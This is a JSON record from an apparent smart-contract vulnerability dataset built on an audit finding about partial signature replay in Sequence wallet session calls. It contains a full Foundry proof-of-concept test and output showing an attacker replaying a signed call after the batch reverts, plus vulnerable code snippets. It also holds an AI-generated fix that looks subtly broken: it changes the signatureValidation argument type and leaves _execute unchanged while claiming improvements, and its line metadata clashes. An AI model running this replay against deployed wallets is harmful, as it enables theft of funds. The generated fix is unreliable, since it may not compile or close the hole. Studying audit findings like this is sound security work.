@@ -1,0 +1,207 @@
+{
+  "id": "63761",
+  "extraction_type": "github_complete",
+  "source_url": "https://github.com/code-423n4/2025-10-sequence/blob/b0e5fb15bf6735ec9aaba02f5eca28a7882d815d/src/modules/Calls.sol# L36-L48",
+  "is_complete": true,
+  "tier": "tier_1",
+  "referenced_lines": [
+    [
+      36,
+      48
+    ],
+    [
+      61,
+      123
+    ],
+    [
+      136,
+      176
+    ],
+    [
+      36,
+      48
+    ],
+    [
+      61,
+      123
+    ],
+    [
+      136,
+      176
+    ]
+  ],
+  "filename": "63761_Calls.sol",
+  "has_pragma": true,
+  "has_contract": true,
+  "has_function": true,
+  "balanced_braces": true,
+  "num_lines": 124,
+  "vulnerability_title": "[H-02] Partial signature replay/frontrunning attack on session calls",
+  "recommendation": {
+    "has_recommendation": true,
+    "recommendation_text": "Bind session call signatures to the complete payload hash to prevent partial signature replay.",
+    "fix_code_blocks": []
+  },
+  "poc": {
+    "has_poc": true,
+    "poc_text": "Create a file `POC.t.sol` under `test` directory and put the following content:\n```\n\n// SPDX-License-Identifier: Apache-2.0\npragma solidity ^0.8.27;\n\nimport { Vm, console } from \"forge-std/Test.sol\";\nimport { SessionTestBase } from \"test/extensions/sessions/SessionTestBase.sol\";\n\nimport { PrimitivesRPC } from \"test/utils/PrimitivesRPC.sol\";\n\nimport { Factory } from \"src/Factory.sol\";\nimport { Stage1Module } from \"src/Stage1Module.sol\";\nimport { SessionErrors } from \"src/extensions/sessions/SessionErrors.sol\";\nimport { SessionManager } from \"src/extensions/sessions/SessionManager.sol\";\nimport { SessionSig } from \"src/extensions/sessions/SessionSig.sol\";\nimport { SessionPermissions } from \"src/extensions/sessions/explicit/IExplicitSessionManager.sol\";\nimport {\n  ParameterOperation, ParameterRule, Permission, UsageLimit\n} from \"src/extensions/sessions/explicit/Permission.sol\";\nimport { Attestation, LibAttestation } from \"src/extensions/sessions/implicit/Attestation.sol\";\nimport { Calls } from \"src/modules/Calls.sol\";\nimport { ERC4337v07 } from \"src/modules/ERC4337v07.sol\";\nimport { Payload } from \"src/modules/Payload.sol\";\nimport { ISapient } from \"src/modules/interfaces/ISapient.sol\";\n\ncontract Emitter {\n\n  using LibAttestation for Attestation;\n\n  event Implicit(address sender);\n  event Explicit(address sender);\n\n  error InvalidCall(string reason);\n\n  uint256 counter;\n\n  // Deliberately revert on the second call to emulate calls' revert behavior\n  modifier notTwice() {\n    counter++;\n    console.log(\"Counter: \", counter);\n    if (counter == 2) {\n      console.log(\"Original execution reverts\");\n      revert(\"NotTwice\");\n    }\n    _;\n  }\n\n  function implicitEmit() external notTwice {\n    emit Implicit(msg.sender);\n  }\n\n  function explicitEmit() external {\n    emit Explicit(msg.sender);\n  }\n\n  function acceptImplicitRequest(\n    address wallet,\n    Attestation calldata attestation,\n    Payload.Call calldata call\n  ) external pure returns (bytes32) {\n    if (call.data.length != 4 || bytes4(call.data[:4]) != this.implicitEmit.selector) {\n      return bytes32(0);\n    }\n    return attestation.generateImplicitRequestMagic(wallet);\n  }\n\n}\n\ncontract POC is SessionTestBase {\n\n  Factory public factory;\n  Stage1Module public module;\n  SessionManager public sessionManager;\n  Vm.Wallet public sessionWallet;\n  Vm.Wallet public identityWallet;\n  Emitter public target;\n  address wallet;\n  string config;\n  string topology;\n\n  function setUp() public {\n    sessionWallet = vm.createWallet(\"session\");\n    identityWallet = vm.createWallet(\"identity\");\n    sessionManager = new SessionManager();\n    factory = new Factory();\n    module = new Stage1Module(address(factory), address(0));\n    target = new Emitter();\n\n    topology = PrimitivesRPC.sessionEmpty(vm, identityWallet.addr);\n    SessionPermissions memory sessionPerms = SessionPermissions({\n      signer: sessionWallet.addr,\n      chainId: 0,\n      valueLimit: 0,\n      deadline: uint64(block.timestamp + 1 days),\n      permissions: new Permission[](1)\n    });\n    sessionPerms.permissions[0] = Permission({ target: address(target), rules: new ParameterRule[](0) });\n    string memory sessionPermsJson = _sessionPermissionsToJSON(sessionPerms);\n    topology = PrimitivesRPC.sessionExplicitAdd(vm, sessionPermsJson, topology);\n    topology = PrimitivesRPC.sessionImplicitAddBlacklistAddress(vm, topology, address(0));\n    bytes32 sessionImageHash = PrimitivesRPC.sessionImageHash(vm, topology);\n\n    {\n      string memory ce = string(\n        abi.encodePacked(\"sapient:\", vm.toString(sessionImageHash), \":\", vm.toString(address(sessionManager)), \":1\")\n      );\n      config = PrimitivesRPC.newConfig(vm, 1, 0, ce);\n    }\n    bytes32 imageHash = PrimitivesRPC.getImageHash(vm, config);\n    wallet = factory.deploy(address(module), imageHash);\n  }\n\n  function testSubmissionValidity() external {\n    // A session signer creates a payload of 2 calls, both of them has REVERT_ON_ERROR behavior\n    Payload.Decoded memory payload = _buildPayload(2);\n    Attestation memory attestation = _createValidAttestation();\n    payload.calls[0] = Payload.Call({\n      to: address(target),\n      value: 0,\n      data: abi.encodeWithSelector(target.implicitEmit.selector),\n      gasLimit: 0,\n      delegateCall: false,\n      onlyFallback: false,\n      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR\n    });\n    payload.calls[1] = Payload.Call({\n      to: address(target),\n      value: 0,\n      data: abi.encodeWithSelector(target.implicitEmit.selector),\n      gasLimit: 0,\n      delegateCall: false,\n      onlyFallback: false,\n      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR\n    });\n    string[] memory callSignatures = _createImplicitCallSignatures(payload, attestation);\n    bytes memory encodedSignature = _createEncodedCallSignature(callSignatures);\n    bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);\n    console.log(\"Original execution starts\");\n    // The second call fails and the whole flow is reverted\n    vm.expectRevert();\n    Calls(wallet).execute(packedPayload, encodedSignature);\n    // now the attacker can reuse partial signature to replay the calls just before the failed one\n    {\n      Payload.Call[] memory calls = payload.calls;\n      assembly {\n        mstore(calls, 1) // discard the last call from payload\n        mstore(callSignatures, 1) // reuse the first call sig, discard the last one\n      }\n      // The following helpers don't re-generate/override call signatures\n      bytes memory encodedSignature = _createEncodedCallSignature(callSignatures);\n      bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);\n      console.log(\"Attacker partial replay starts\");\n      Calls(wallet).execute(packedPayload, encodedSignature);\n      console.log(\"Attacker partial replay succeeded\");\n    }\n  }\n\n  function _createValidAttestation() internal view returns (Attestation memory) {\n    Attestation memory attestation;\n    attestation.approvedSigner = sessionWallet.addr;\n    attestation.authData.redirectUrl = \"https://example.com\";\n    attestation.authData.issuedAt = uint64(block.timestamp);\n    return attestation;\n  }\n\n  function _createImplicitCallSignatures(\n    Payload.Decoded memory payload,\n    Attestation memory attestation\n  ) internal returns (string[] memory callSignatures) {\n    uint256 callCount = payload.calls.length;\n    callSignatures = new string[](callCount);\n\n    for (uint256 i; i < callCount; i++) {\n      callSignatures[i] = _createImplicitCallSignature(payload, i, sessionWallet, identityWallet, attestation);\n    }\n  }\n\n  function _createEncodedCallSignature(\n    string[] memory callSignatures\n  ) internal returns (bytes memory encodedSig) {\n    address[] memory explicitSigners = new address[](0);\n    address[] memory implicitSigners = new address[](1);\n    implicitSigners[0] = sessionWallet.addr;\n    encodedSig =\n      PrimitivesRPC.sessionEncodeCallSignatures(vm, topology, callSignatures, explicitSigners, implicitSigners);\n    string memory signatures =\n      string(abi.encodePacked(vm.toString(address(sessionManager)), \":sapient:\", vm.toString(encodedSig)));\n    encodedSig = PrimitivesRPC.toEncodedSignature(vm, config, signatures, false);\n  }\n\n}\n```\n\nConsole output:\n```\n\n[PASS] testSubmissionValidity() (gas: 605942)\nLogs:\n  Original execution starts\n  Counter:  1\n  Counter:  2\n  Original execution reverts\n  Attacker partial replay starts\n  Counter:  1\n  Attacker partial replay succeeded\n```\n\n---",
+    "poc_code_blocks": [
+      "// SPDX-License-Identifier: Apache-2.0\npragma solidity ^0.8.27;\n\nimport { Vm, console } from \"forge-std/Test.sol\";\nimport { SessionTestBase } from \"test/extensions/sessions/SessionTestBase.sol\";\n\nimport { PrimitivesRPC } from \"test/utils/PrimitivesRPC.sol\";\n\nimport { Factory } from \"src/Factory.sol\";\nimport { Stage1Module } from \"src/Stage1Module.sol\";\nimport { SessionErrors } from \"src/extensions/sessions/SessionErrors.sol\";\nimport { SessionManager } from \"src/extensions/sessions/SessionManager.sol\";\nimport { SessionSig } from \"src/extensions/sessions/SessionSig.sol\";\nimport { SessionPermissions } from \"src/extensions/sessions/explicit/IExplicitSessionManager.sol\";\nimport {\n  ParameterOperation, ParameterRule, Permission, UsageLimit\n} from \"src/extensions/sessions/explicit/Permission.sol\";\nimport { Attestation, LibAttestation } from \"src/extensions/sessions/implicit/Attestation.sol\";\nimport { Calls } from \"src/modules/Calls.sol\";\nimport { ERC4337v07 } from \"src/modules/ERC4337v07.sol\";\nimport { Payload } from \"src/modules/Payload.sol\";\nimport { ISapient } from \"src/modules/interfaces/ISapient.sol\";\n\ncontract Emitter {\n\n  using LibAttestation for Attestation;\n\n  event Implicit(address sender);\n  event Explicit(address sender);\n\n  error InvalidCall(string reason);\n\n  uint256 counter;\n\n  // Deliberately revert on the second call to emulate calls' revert behavior\n  modifier notTwice() {\n    counter++;\n    console.log(\"Counter: \", counter);\n    if (counter == 2) {\n      console.log(\"Original execution reverts\");\n      revert(\"NotTwice\");\n    }\n    _;\n  }\n\n  function implicitEmit() external notTwice {\n    emit Implicit(msg.sender);\n  }\n\n  function explicitEmit() external {\n    emit Explicit(msg.sender);\n  }\n\n  function acceptImplicitRequest(\n    address wallet,\n    Attestation calldata attestation,\n    Payload.Call calldata call\n  ) external pure returns (bytes32) {\n    if (call.data.length != 4 || bytes4(call.data[:4]) != this.implicitEmit.selector) {\n      return bytes32(0);\n    }\n    return attestation.generateImplicitRequestMagic(wallet);\n  }\n\n}\n\ncontract POC is SessionTestBase {\n\n  Factory public factory;\n  Stage1Module public module;\n  SessionManager public sessionManager;\n  Vm.Wallet public sessionWallet;\n  Vm.Wallet public identityWallet;\n  Emitter public target;\n  address wallet;\n  string config;\n  string topology;\n\n  function setUp() public {\n    sessionWallet = vm.createWallet(\"session\");\n    identityWallet = vm.createWallet(\"identity\");\n    sessionManager = new SessionManager();\n    factory = new Factory();\n    module = new Stage1Module(address(factory), address(0));\n    target = new Emitter();\n\n    topology = PrimitivesRPC.sessionEmpty(vm, identityWallet.addr);\n    SessionPermissions memory sessionPerms = SessionPermissions({\n      signer: sessionWallet.addr,\n      chainId: 0,\n      valueLimit: 0,\n      deadline: uint64(block.timestamp + 1 days),\n      permissions: new Permission[](1)\n    });\n    sessionPerms.permissions[0] = Permission({ target: address(target), rules: new ParameterRule[](0) });\n    string memory sessionPermsJson = _sessionPermissionsToJSON(sessionPerms);\n    topology = PrimitivesRPC.sessionExplicitAdd(vm, sessionPermsJson, topology);\n    topology = PrimitivesRPC.sessionImplicitAddBlacklistAddress(vm, topology, address(0));\n    bytes32 sessionImageHash = PrimitivesRPC.sessionImageHash(vm, topology);\n\n    {\n      string memory ce = string(\n        abi.encodePacked(\"sapient:\", vm.toString(sessionImageHash), \":\", vm.toString(address(sessionManager)), \":1\")\n      );\n      config = PrimitivesRPC.newConfig(vm, 1, 0, ce);\n    }\n    bytes32 imageHash = PrimitivesRPC.getImageHash(vm, config);\n    wallet = factory.deploy(address(module), imageHash);\n  }\n\n  function testSubmissionValidity() external {\n    // A session signer creates a payload of 2 calls, both of them has REVERT_ON_ERROR behavior\n    Payload.Decoded memory payload = _buildPayload(2);\n    Attestation memory attestation = _createValidAttestation();\n    payload.calls[0] = Payload.Call({\n      to: address(target),\n      value: 0,\n      data: abi.encodeWithSelector(target.implicitEmit.selector),\n      gasLimit: 0,\n      delegateCall: false,\n      onlyFallback: false,\n      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR\n    });\n    payload.calls[1] = Payload.Call({\n      to: address(target),\n      value: 0,\n      data: abi.encodeWithSelector(target.implicitEmit.selector),\n      gasLimit: 0,\n      delegateCall: false,\n      onlyFallback: false,\n      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR\n    });\n    string[] memory callSignatures = _createImplicitCallSignatures(payload, attestation);\n    bytes memory encodedSignature = _createEncodedCallSignature(callSignatures);\n    bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);\n    console.log(\"Original execution starts\");\n    // The second call fails and the whole flow is reverted\n    vm.expectRevert();\n    Calls(wallet).execute(packedPayload, encodedSignature);\n    // now the attacker can reuse partial signature to replay the calls just before the failed one\n    {\n      Payload.Call[] memory calls = payload.calls;\n      assembly {\n        mstore(calls, 1) // discard the last call from payload\n        mstore(callSignatures, 1) // reuse the first call sig, discard the last one\n      }\n      // The following helpers don't re-generate/override call signatures\n      bytes memory encodedSignature = _createEncodedCallSignature(callSignatures);\n      bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);\n      console.log(\"Attacker partial replay starts\");\n      Calls(wallet).execute(packedPayload, encodedSignature);\n      console.log(\"Attacker partial replay succeeded\");\n    }\n  }\n\n  function _createValidAttestation() internal view returns (Attestation memory) {\n    Attestation memory attestation;\n    attestation.approvedSigner = sessionWallet.addr;\n    attestation.authData.redirectUrl = \"https://example.com\";\n    attestation.authData.issuedAt = uint64(block.timestamp);\n    return attestation;\n  }\n\n  function _createImplicitCallSignatures(\n    Payload.Decoded memory payload,\n    Attestation memory attestation\n  ) internal returns (string[] memory callSignatures) {\n    uint256 callCount = payload.calls.length;\n    callSignatures = new string[](callCount);\n\n    for (uint256 i; i < callCount; i++) {\n      callSignatures[i] = _createImplicitCallSignature(payload, i, sessionWallet, identityWallet, attestation);\n    }\n  }\n\n  function _createEncodedCallSignature(\n    string[] memory callSignatures\n  ) internal returns (bytes memory encodedSig) {\n    address[] memory explicitSigners = new address[](0);\n    address[] memory implicitSigners = new address[](1);\n    implicitSigners[0] = sessionWallet.addr;\n    encodedSig =\n      PrimitivesRPC.sessionEncodeCallSignatures(vm, topology, callSignatures, explicitSigners, implicitSigners);\n    string memory signatures =\n      string(abi.encodePacked(vm.toString(address(sessionManager)), \":sapient:\", vm.toString(encodedSig)));\n    encodedSig = PrimitivesRPC.toEncodedSignature(vm, config, signatures, false);\n  }\n\n}",
+      "[PASS] testSubmissionValidity() (gas: 605942)\nLogs:\n  Original execution starts\n  Counter:  1\n  Counter:  2\n  Original execution reverts\n  Attacker partial replay starts\n  Counter:  1\n  Attacker partial replay succeeded"
+    ]
+  },
+  "problem_code": {
+    "has_problem_code": true,
+    "source": "github_line_refs_function_scope",
+    "snippets": [
+      {
+        "function_name": "execute",
+        "start_line": 36,
+        "end_line": 48,
+        "code": "  function execute(bytes calldata _payload, bytes calldata _signature) external payable virtual nonReentrant {\n    uint256 startingGas = gasleft();\n    Payload.Decoded memory decoded = Payload.fromPackedCalls(_payload);\n\n    _consumeNonce(decoded.space, decoded.nonce);\n    (bool isValid, bytes32 opHash) = signatureValidation(decoded, _signature);\n\n    if (!isValid) {\n      revert InvalidSignature(decoded, _signature);\n    }\n\n    _execute(startingGas, opHash, decoded);\n  }",
+        "confidence": 97,
+        "reason": "Function enclosing GitHub-referenced vulnerable line",
+        "matched_references": [
+          [
+            36,
+            48
+          ],
+          [
+            36,
+            48
+          ]
+        ]
+      },
+      {
+        "function_name": "_execute",
+        "start_line": 61,
+        "end_line": 122,
+        "code": "\n  function _execute(uint256 _startingGas, bytes32 _opHash, Payload.Decoded memory _decoded) private {\n    bool errorFlag = false;\n\n    uint256 numCalls = _decoded.calls.length;\n    for (uint256 i = 0; i < numCalls; i++) {\n      Payload.Call memory call = _decoded.calls[i];\n\n      // Skip onlyFallback calls if no error occurred\n      if (call.onlyFallback && !errorFlag) {\n        emit CallSkipped(_opHash, i);\n        continue;\n      }\n\n      // Reset the error flag\n      // onlyFallback calls only apply when the immediately preceding transaction fails\n      errorFlag = false;\n\n      uint256 gasLimit = call.gasLimit;\n      if (gasLimit != 0 && gasleft() < gasLimit) {\n        revert NotEnoughGas(_decoded, i, gasleft());\n      }\n\n      bool success;\n      if (call.delegateCall) {\n        (success) = LibOptim.delegatecall(\n          call.to,\n          gasLimit == 0 ? gasleft() : gasLimit,\n          abi.encodeWithSelector(\n            IDelegatedExtension.handleSequenceDelegateCall.selector,\n            _opHash,\n            _startingGas,\n            i,\n            numCalls,\n            _decoded.space,\n            call.data\n          )\n        );\n      } else {\n        (success) = LibOptim.call(call.to, call.value, gasLimit == 0 ? gasleft() : gasLimit, call.data);\n      }\n\n      if (!success) {\n        if (call.behaviorOnError == Payload.BEHAVIOR_IGNORE_ERROR) {\n          errorFlag = true;\n          emit CallFailed(_opHash, i, LibOptim.returnData());\n          continue;\n        }\n\n        if (call.behaviorOnError == Payload.BEHAVIOR_REVERT_ON_ERROR) {\n          revert Reverted(_decoded, i, LibOptim.returnData());\n        }\n\n        if (call.behaviorOnError == Payload.BEHAVIOR_ABORT_ON_ERROR) {\n          emit CallAborted(_opHash, i, LibOptim.returnData());\n          break;\n        }\n      }\n\n      emit CallSucceeded(_opHash, i);\n    }\n  }",
+        "confidence": 97,
+        "reason": "Function enclosing GitHub-referenced vulnerable line",
+        "matched_references": [
+          [
+            61,
+            123
+          ],
+          [
+            61,
+            123
+          ]
+        ]
+      },
+      {
+        "code": "    }\n  }\n\n}",
+        "start_line": 136,
+        "end_line": 136,
+        "context_start_line": 121,
+        "context_end_line": 124,
+        "confidence": 95,
+        "reason": "GitHub URL includes explicit vulnerable line references"
+      },
+      {
+        "code": "    }\n  }\n\n}",
+        "start_line": 136,
+        "end_line": 136,
+        "context_start_line": 121,
+        "context_end_line": 124,
+        "confidence": 95,
+        "reason": "GitHub URL includes explicit vulnerable line references"
+      }
+    ]
+  },
+  "extraction_date": "2026-04-24T16:08:01.967057",
+  "validation": {
+    "content_code_consistency": {
+      "consistent": true,
+      "confidence": 95,
+      "summary_matches": true,
+      "content_matches": true,
+      "summary_reasoning": "The summary accurately describes the vulnerability related to partial signature replay and frontrunning attacks, which are evident in the provided code snippets.",
+      "content_reasoning": "The content mentions specific functions and variables that exist in the code, such as `execute`, `_execute`, and the nonce handling, which are directly related to the described vulnerabilities.",
+      "functions_found": [
+        "execute",
+        "_execute"
+      ],
+      "variables_found": [
+        "_payload",
+        "_signature",
+        "decoded"
+      ],
+      "patterns_found": [
+        "partial signature replay",
+        "frontrunning"
+      ],
+      "issues": []
+    },
+    "report_tag_validation": {
+      "existing_tag": "None",
+      "tag_present": false,
+      "tag_correct": null,
+      "confidence": 90,
+      "reasoning": "There is no existing tag, and a relevant tag should be assigned to reflect the nature of the vulnerability.",
+      "suggested_tag": "Replay Attack",
+      "alternative_tags": [
+        "Signature Vulnerability",
+        "Frontrunning"
+      ],
+      "correction_explanation": "A tag is necessary to categorize the vulnerability effectively, and 'Replay Attack' is appropriate given the nature of the issue."
+    },
+    "mando_classification": {
+      "primary_category": "front_running",
+      "secondary_categories": [],
+      "confidence": 90,
+      "mando_applicable": true,
+      "reasoning": "The vulnerability primarily involves frontrunning attacks, which is well-captured by the MANDO category for transaction ordering issues."
+    },
+    "scsvs_classification": {
+      "primary_category": "G4",
+      "primary_category_name": "Business logic",
+      "secondary_categories": [
+        "G5"
+      ],
+      "confidence": 90,
+      "use_scsvs_instead": true,
+      "reasoning": "The SCSVS categories provide a more granular classification, particularly in identifying issues related to business logic and access control, which are relevant to the described vulnerabilities.",
+      "vulnerability_type": "Partial signature replay and frontrunning attack on session calls"
+    },
+    "generated_fix": {
+      "has_fix": true,
+      "fix_approach": "Bind session call signatures to the complete payload hash to prevent partial signature replay.",
+      "fixed_code_blocks": [
+        {
+          "snippet_index": 1,
+          "function_name": "execute",
+          "fixed_function_code": "function execute(bytes calldata _payload, bytes calldata _signature) external payable virtual nonReentrant {\n    uint256 startingGas = gasleft();\n    Payload.Decoded memory decoded = Payload.fromPackedCalls(_payload);\n\n    _consumeNonce(decoded.space, decoded.nonce);\n    (bool isValid, bytes32 opHash) = signatureValidation(keccak256(_payload), _signature);\n\n    if (!isValid) {\n      revert InvalidSignature(decoded, _signature);\n    }\n\n    _execute(startingGas, opHash, decoded);\n  }",
+          "reasoning": "This function now binds the signature validation to the hash of the complete payload, preventing partial signature replay attacks."
+        },
+        {
+          "snippet_index": 2,
+          "function_name": "_execute",
+          "fixed_function_code": "function _execute(uint256 _startingGas, bytes32 _opHash, Payload.Decoded memory _decoded) private {\n    bool errorFlag = false;\n\n    uint256 numCalls = _decoded.calls.length;\n    for (uint256 i = 0; i < numCalls; i++) {\n      Payload.Call memory call = _decoded.calls[i];\n\n      // Skip onlyFallback calls if no error occurred\n      if (call.onlyFallback && !errorFlag) {\n        emit CallSkipped(_opHash, i);\n        continue;\n      }\n\n      // Reset the error flag\n      errorFlag = false;\n\n      uint256 gasLimit = call.gasLimit;\n      if (gasLimit != 0 && gasleft() < gasLimit) {\n        revert NotEnoughGas(_decoded, i, gasleft());\n      }\n\n      bool success;\n      if (call.delegateCall) {\n        (success) = LibOptim.delegatecall(\n          call.to,\n          gasLimit == 0 ? gasleft() : gasLimit,\n          abi.encodeWithSelector(\n            IDelegatedExtension.handleSequenceDelegateCall.selector,\n            _opHash,\n            _startingGas,\n            i,\n            numCalls,\n            _decoded.space,\n            call.data\n          )\n        );\n      } else {\n        (success) = LibOptim.call(call.to, call.value, gasLimit == 0 ? gasleft() : gasLimit, call.data);\n      }\n\n      if (!success) {\n        if (call.behaviorOnError == Payload.BEHAVIOR_IGNORE_ERROR) {\n          errorFlag = true;\n          emit CallFailed(_opHash, i, LibOptim.returnData());\n          continue;\n        }\n\n        if (call.behaviorOnError == Payload.BEHAVIOR_REVERT_ON_ERROR) {\n          revert Reverted(_decoded, i, LibOptim.returnData());\n        }\n\n        if (call.behaviorOnError == Payload.BEHAVIOR_ABORT_ON_ERROR) {\n          emit CallAborted(_opHash, i, LibOptim.returnData());\n          break;\n        }\n      }\n\n      emit CallSucceeded(_opHash, i);\n    }\n  }",
+          "reasoning": "This function remains unchanged in logic but is now called with a securely validated operation hash, ensuring that only valid calls are executed."
+        }
+      ],
+      "key_changes": [
+        "Signature validation now uses the hash of the complete payload.",
+        "Ensured that the execution logic is bound to the validated operation hash."
+      ],
+      "security_improvements": [
+        "Mitigated partial signature replay attacks.",
+        "Reduced risk of frontrunning by ensuring signatures are tied to the complete payload."
+      ],
+      "additional_recommendations": "Consider implementing rate limiting or nonce management for session calls to further enhance security.",
+      "confidence": 90,
+      "fix_code": "function execute(bytes calldata _payload, bytes calldata _signature) external payable virtual nonReentrant {\n    uint256 startingGas = gasleft();\n    Payload.Decoded memory decoded = Payload.fromPackedCalls(_payload);\n\n    _consumeNonce(decoded.space, decoded.nonce);\n    (bool isValid, bytes32 opHash) = signatureValidation(keccak256(_payload), _signature);\n\n    if (!isValid) {\n      revert InvalidSignature(decoded, _signature);\n    }\n\n    _execute(startingGas, opHash, decoded);\n  }\n\nfunction _execute(uint256 _startingGas, bytes32 _opHash, Payload.Decoded memory _decoded) private {\n    bool errorFlag = false;\n\n    uint256 numCalls = _decoded.calls.length;\n    for (uint256 i = 0; i < numCalls; i++) {\n      Payload.Call memory call = _decoded.calls[i];\n\n      // Skip onlyFallback calls if no error occurred\n      if (call.onlyFallback && !errorFlag) {\n        emit CallSkipped(_opHash, i);\n        continue;\n      }\n\n      // Reset the error flag\n      errorFlag = false;\n\n      uint256 gasLimit = call.gasLimit;\n      if (gasLimit != 0 && gasleft() < gasLimit) {\n        revert NotEnoughGas(_decoded, i, gasleft());\n      }\n\n      bool success;\n      if (call.delegateCall) {\n        (success) = LibOptim.delegatecall(\n          call.to,\n          gasLimit == 0 ? gasleft() : gasLimit,\n          abi.encodeWithSelector(\n            IDelegatedExtension.handleSequenceDelegateCall.selector,\n            _opHash,\n            _startingGas,\n            i,\n            numCalls,\n            _decoded.space,\n            call.data\n          )\n        );\n      } else {\n        (success) = LibOptim.call(call.to, call.value, gasLimit == 0 ? gasleft() : gasLimit, call.data);\n      }\n\n      if (!success) {\n        if (call.behaviorOnError == Payload.BEHAVIOR_IGNORE_ERROR) {\n          errorFlag = true;\n          emit CallFailed(_opHash, i, LibOptim.returnData());\n          continue;\n        }\n\n        if (call.behaviorOnError == Payload.BEHAVIOR_REVERT_ON_ERROR) {\n          revert Reverted(_decoded, i, LibOptim.returnData());\n        }\n\n        if (call.behaviorOnError == Payload.BEHAVIOR_ABORT_ON_ERROR) {\n          emit CallAborted(_opHash, i, LibOptim.returnData());\n          break;\n        }\n      }\n\n      emit CallSucceeded(_opHash, i);\n    }\n  }",
+      "expected_fixed_blocks": 4,
+      "returned_fixed_blocks": 2,
+      "block_count_match": false,
+      "generated_by": "openai",
+      "generation_date": "2026-04-26T00:51:00.677797"
+    },
+    "fix_code_source": "generated",
+    "validated_at": "2026-04-26T00:51:00.677819",
+    "model": "gpt-4o-mini",
+    "code_input_source": "github_line_refs_function_scope"
+  }
+}
